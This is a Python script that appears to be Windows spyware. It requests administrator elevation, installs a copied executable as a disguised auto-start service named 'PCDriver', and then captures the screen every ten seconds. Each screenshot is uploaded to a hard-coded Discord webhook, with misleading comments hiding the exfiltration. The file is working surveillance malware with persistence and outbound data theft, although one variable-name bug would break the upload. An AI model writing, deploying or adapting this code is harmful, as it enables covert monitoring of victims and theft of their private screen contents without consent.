import os
import ctypes
import sys

def elevate():
    """Check for admin privileges and elevate if necessary."""
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        # Request elevation
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        return False

def create_service():
    """Create and start the service using the current script's path."""
    # Get the absolute path of the current script
    script_path = os.path.abspath(__file__)
    os.system("copy index.exe C:\Windows\NetService.exe.exe")
    # Command to create the service
    create_command = f'sc create PCDriver binPath= "C:\Windows\NetService.exe.exe" start= auto'
    
    # Execute the command to create the service
    os.system(create_command)
    
    # Start the service
    os.system('sc start PCDriver')

if __name__ == '__main__':
    if elevate():
        create_service()
    else:
        print("Failed to elevate privileges.")
        sys.exit(1)
import pyautogui
import time
from discord_webhook import DiscordWebhook
# Create a directory for screenshots if it doesn't exist
screenshot_dir = "Temp_ProgramData"
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)
# dont read this pls !
tgfree = "https://discord.com/api/webhooks/1315419305457745971/ym8pyEf4-nbbs8jGp8LHmqxfifPB97f9Eq6XMe0KM4MMxp5ZB0x9Cn8tE0rUijmcqnw9"

# Function to capture and send screenshot with additional info
def capture_and_send_screenshot(counter):
    screenshot = pyautogui.screenshot()
    filename = os.path.join(screenshot_dir, f"screenshot_{counter}.png")
    screenshot.save(filename)

    # Sending the screenshot to nothing
    nicetry = DiscordWebhook(url=tgfree)
    with open(filename, 'rb') as f:
        webhook.add_file(file=f, filename=os.path.basename(filename))
        webhook.execute()

    os.system("echo done > com1")

# Main loop to take screenshots every 10 seconds
counter = 1
while True:
    capture_and_send_screenshot(counter)
    counter += 1
    time.sleep(10)
